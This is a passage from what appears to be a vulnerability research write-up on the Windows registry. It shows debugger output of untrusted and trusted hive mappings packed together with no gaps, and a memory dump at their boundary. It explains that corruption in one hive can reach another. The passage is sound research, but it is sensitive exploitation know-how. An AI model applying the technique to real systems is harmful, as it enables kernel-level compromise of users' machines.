 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b8de0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15281400&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152815ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b8840&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15281600&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152817ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b8980&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15281800&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152819ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;What we have here are &lt;/span&gt;&lt;span&gt;interleaved mappings of trusted and untrusted hives, each 2 MiB in length and tightly packed with 512 bins of 16 KiB each.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Importantly, there are no gaps between the end of one mapping and the start of another, which means that it is indeed possible to use memory corruption within one hive to influence the internal representation of another.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Take, for example, the boundary between the test.dat and SOFTWARE hives at address 0x15280400000.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we dump the memory area encompassing a few dozen bytes before and after this page boundary, we get the following result:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x15280400000-30&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`803fffd0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41-41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`803fffe0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41-41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`803ffff0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41-41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;AAAAAAAAAAAA....&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`80400000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0c-00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;hbin.....@......&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`80400010&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00-00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00000152`80400020&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42-42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span 